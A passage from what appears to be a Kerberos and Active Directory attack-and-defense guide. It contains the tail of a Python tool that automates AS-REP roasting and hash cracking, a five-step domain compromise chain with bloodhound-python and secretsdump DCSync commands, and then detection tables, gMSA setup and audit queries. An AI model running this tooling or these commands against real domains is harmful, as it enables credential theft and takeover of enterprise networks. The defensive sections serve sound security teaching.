                if hash_prefix in hash_key:
                    target.cracked_password = password
                    cracked_count += 1
                    print(f"[+] Cracked: {target.username} : {password}")
                    break

    return cracked_count


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Kerberos Attack Automation CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # AS-REP Roasting from outside without domain credentials
  %(prog)s asrep 10.10.10.100 corp.local -U userlist.txt

  # AS-REP Roasting with automatic cracking
  %(prog)s asrep 10.10.10.100 corp.local -U userlist.txt \\
      -w /usr/share/wordlists/rockyou.txt --workers 20
        """
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    asrep_p = sub.add_parser("asrep", help="AS-REP Roasting")
    asrep_p.add_argument("dc", help="Domain Controller IP")
    asrep_p.add_argument("domain", help="Domain (e.g., corp.local)")
    asrep_p.add_argument("-U", "--userlist", type=Path, required=True,
                         help="Username list file (one per line)")
    asrep_p.add_argument("-w", "--wordlist", type=Path,
                         help="Wordlist for cracking")
    asrep_p.add_argument("--workers", type=int, default=10,
                         help="Number of concurrent requests (default: 10)")

    args = parser.parse_args()

    match args.cmd:
        case "asrep":
            usernames = args.userlist.read_text().splitlines()
            usernames = [u.strip() for u in usernames if u.strip()]
            print(f"[*] Starting AS-REP Roasting against {len(usernames)} accounts")
            targets = batch_asrep_roast(args.dc, args.domain, usernames, args.workers)
            print(f"[+] Hashes obtained: {len(targets)}")

            if args.wordlist and targets:
                print(f"\n[*] Starting cracking (wordlist: {args.wordlist})")
                cracked = crack_kerberos_hashes(targets, args.wordlist)
                print(f"\n[Result] Cracked: {cracked}/{len(targets)}")


if __name__ == "__main__":
    main()
```

---

## 7. Practical Attack Chain: 5 Steps to Full AD Compromise

This reflects the general AD compromise path used by real penetration testers and APT groups.

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Step 1: Initial Access — Obtain any domain user account
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Methods:
  - Phishing email → credential harvesting page
  - Exploit public-facing service (VPN, OWA, Citrix) → shell
  - Malware infection on employee PC (Emotet, Qakbot, etc.)

Result: One low-privilege domain account
  Example: CORP\jsmith (standard employee account)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Step 2: Internal Reconnaissance — Map the AD structure
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Tools: BloodHound, PowerView, ADRecon

BloodHound visualizes attack paths automatically:
  bloodhound-python -u jsmith -p Password -d corp.local \
    -dc dc01.corp.local --dns-tcp -c All
  
  In BloodHound GUI:
  - Run "Shortest Path to Domain Admin" query
  - Identify Kerberoastable accounts
  - Identify AS-REP Roastable accounts
  - Map admin privilege chains

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Step 3: Privilege Escalation — Crack service accounts or exploit vulnerabilities
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Path A — Kerberoasting:
  Find account with registered SPN → request ticket → crack offline
  → Recover password "Summer2023!" for IT-SVC-BACKUP account
  → This account is a member of the server management group

Path B — AS-REP Roasting:
  Find DONT_REQ_PREAUTH account → collect AS-REP → crack
  → Crack intern account "TempUser01"
  → This account has local admin rights on a specific server

Path C — Exploit vulnerabilities:
  PrintNightmare, ZeroLogon, noPac, and other local/domain exploits

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Step 4: Lateral Movement — Reach the Domain Controller
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Using the obtained service account or local admin credentials:
  - Pass-the-Hash to pivot to other servers
  - Dump additional credentials from server memory (LSASS)
  - Discover higher-privilege accounts

Final goal: Access the DC with local admin or DA (Domain Admin) account

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Step 5: Domain Dominance — Obtain krbtgt hash → Golden Ticket
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Once DC access is achieved:
  # DCSync — impersonate DC, dump all account hashes
  python3 secretsdump.py domain.local/admin:Password@DC_IP
  
  Key hashes obtained:
  # krbtgt hash → Create Golden Ticket
  # Administrator hash → Direct authentication
  # All user hashes → Offline cracking

After Golden Ticket creation:
  → Access to any service in the domain
  → Persistent backdoor until krbtgt is reset twice
  → Can spread to connected domains via Trust relationships

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Outcome: Complete enterprise compromise
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## 8. Detection and Defense

| Attack | Detection | Defense |
|--------|-----------|---------|
| Kerberoasting | Spike in TGS-REQ (Event 4769) with RC4 encryption type from single source | Strong service account passwords (25+ chars) / Use gMSA / Enforce AES-only |
| AS-REP Roasting | Event 4768 with RC4 encryption, no pre-auth required | Enable pre-authentication for all accounts / Remove DONT_REQ_PREAUTH |
| Pass-the-Ticket | Anomalous ticket source IPs / Service access inconsistent with user patterns | Kerberos Armoring (FAST) / Add accounts to Protected Users group |
| Golden Ticket | DCSync detection (Event 4662) / Abnormal TGT lifetime values | Reset krbtgt password twice / Use Privileged Access Workstations |
| Silver Ticket | Service access with no corresponding KDC traffic | Strengthen service account passwords / Regular rotation |
| Overpass-the-Hash | NTLM→Kerberos conversion (Event 4648) | Enable Credential Guard / Restrict NTLM usage |

**gMSA Setup — Complete Defense Against Kerberoasting:**
```powershell
# Create gMSA — 240-character password auto-generated and auto-rotated
New-ADServiceAccount -Name "sql-svc" -DNSHostName "sql.corp.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers_Group"

# Install gMSA on the target server
Install-ADServiceAccount -Identity "sql-svc"

# With a 240-character random password, hashcat cracking is practically impossible
# Password is automatically rotated by AD — no manual rotation needed
```

**Monitoring Queries for AD Attack Detection:**
```powershell
# Find accounts vulnerable to AS-REP Roasting
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} `
  -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName

# Find accounts vulnerable to Kerberoasting
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
  -Properties ServicePrincipalName | Select-Object Name, ServicePrincipalName

# Check krbtgt password age (should be reset regularly)
Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet
```

---

## Attack Detection and Defense Validation

AD attacks cover *how* you take over a domain, but from the defender's side you must verify **whether the technique surfaces in Windows security events** and **whether the control actually blocks it**. Attackers can use this lens too, to judge which controls are real obstacles.

### Attack -> mitigation layer -> control (defender) -> detection signal

| Technique | Targeted mitigation | Primary control (prevention) | Detection signal |
|---|---|---|---|
| Kerberoasting | - | Enforce AES, strong SPN-account PW, gMSA | EID 4769 RC4 (0x17) ticket-request spike |
| AS-REP Roasting | - | Enforce pre-auth (remove `DONT_REQ_PREAUTH`) | EID 4768 accounts without pre-auth |
| Golden/Silver Ticket | - | Reset krbtgt twice, monitor | EID 4769 abnormal tickets, TGT for non-existent account |

### Defense validation (verify yourself)

```powershell
# 1) Confirm RC4 ticket requests (a Kerberoasting signal) are logged -- 4769 + encryption 0x17
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} -MaxEvents 50 |
  Where-Object { $_.Message -match '0x17' }
# 2) Check for accounts not requiring pre-auth (AS-REP targets)
Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' -Properties DoesNotRequirePreAuth
# Should be empty; any result exposes AS-REP Roasting -> enforce pre-auth on it
```

> Run validation only on **systems you own, in a controlled environment**. "Configured" is not the same as "blocked at runtime" -- reproduce the PoC and confirm the mitigation stops it (see [[68_Purple_Team]]).
